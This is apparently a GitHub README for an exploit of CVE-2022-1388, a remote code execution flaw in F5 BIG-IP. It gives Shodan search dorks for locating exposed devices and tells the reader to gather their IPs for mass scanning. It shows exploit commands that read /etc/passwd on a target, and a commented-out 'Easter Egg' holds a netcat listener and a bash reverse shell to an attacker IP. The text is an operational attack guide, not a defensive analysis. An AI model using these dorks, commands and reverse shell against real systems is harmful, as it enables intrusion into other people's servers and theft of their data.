# CVE-2022-1388
![](https://img.shields.io/static/v1?label=Product&message=F5%20Big%20IP&color=blue)
![](https://img.shields.io/static/v1?label=Version&message=all%2012.1.x%20and%2011.6.x%2016.1.x,%20prior%20to%2016.1.2.2,%2015.1.x,%20prior%20to%2015.1.5.1&color=brighgreen)
![](https://img.shields.io/static/v1?label=Vulnerability&message=CVSSv3:%209.8.%20Remote%20Code%20Execution&color=red)


- Shodan dork:
```
http.title:"BIG-IP&reg;-Redirect" +"Server"
```
```
http.favicon.hash:-335242539
```
Download the shodan json file and extract all IP addresses from it. You can do this with [shodan-parser](https://github.com/getdrive/POC/blob/main/2023/Ivanti%20Endpoint%20Manager%20Mobile%20(EPMM)/shodan-parser.py) or any other tool.
Save them to the **_list_ip_** file.

Usage
---
- Check:
```
chmod +x scanner.sh; bash scanner.sh
```
- RCE:
```
exploit.py [-h] [-u URL] [-c COMMAND] [-f FILE]
python3 exploit.py -u https://target_IP -c 'cat /etc/passwd'
python3 exploit.py -f urls.txt
```
<!-- Here is an Easter Egg for inquiring minds ;-)
- Reverse Shell:
```
nc -nvlp 8888
python3 exploit.py -u https://target_IP -c "bash -i >&/dev/tcp/attacker_IP/8888 0>&1"
```
-->
